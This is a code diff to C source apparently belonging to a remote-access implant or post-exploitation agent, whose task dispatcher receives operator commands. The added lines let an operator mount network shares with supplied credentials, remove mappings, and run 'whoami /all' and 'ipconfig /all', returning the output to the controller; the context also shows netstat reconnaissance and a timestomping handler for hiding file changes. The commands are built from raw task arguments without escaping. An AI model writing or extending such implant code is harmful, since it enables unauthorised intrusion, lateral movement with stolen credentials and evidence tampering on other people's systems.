@@ -2047,6 +2047,26 @@ void dispatch_task(AgentTask *task) {
         char *out = run_shell("netstat -ano");
         agent_send_result(task->id, out, ""); free(out);
     }
+    else if (strcmp(type_upper, "NET_USE") == 0) {
+        char share[512]="", user[128]="", pass[256]="";
+        json_get_str(args,"share",share,sizeof(share),"");
+        json_get_str(args,"user",user,sizeof(user),"");
+        json_get_str(args,"pass",pass,sizeof(pass),"");
+        char cmd[1024]; snprintf(cmd,sizeof(cmd),"net use \"%s\" \"%s\" /user:\"%s\" 2>&1",share,pass,user);
+        char *out = run_shell(cmd); agent_send_result(task->id, out?out:"", ""); free(out);
+    }
+    else if (strcmp(type_upper, "NET_USE_DEL") == 0) {
+        char cmd[512]; snprintf(cmd,sizeof(cmd),"net use \"%s\" /delete /yes 2>&1", args?args:"");
+        char *out = run_shell(cmd); agent_send_result(task->id, out?out:"", ""); free(out);
+    }
+    else if (strcmp(type_upper, "WHOAMI") == 0) {
+        char *out = run_shell("whoami /all");
+        agent_send_result(task->id, out?out:"", ""); free(out);
+    }
+    else if (strcmp(type_upper, "IPCONFIG") == 0) {
+        char *out = run_shell("ipconfig /all");
+        agent_send_result(task->id, out?out:"", ""); free(out);
+    }
     // ── Phase 1 ──────────────────────────────────────────────────────────────
     else if (strcmp(type_upper, "TIMESTOMP") == 0) {
         char target[512]={0}; char ref[512]={0};
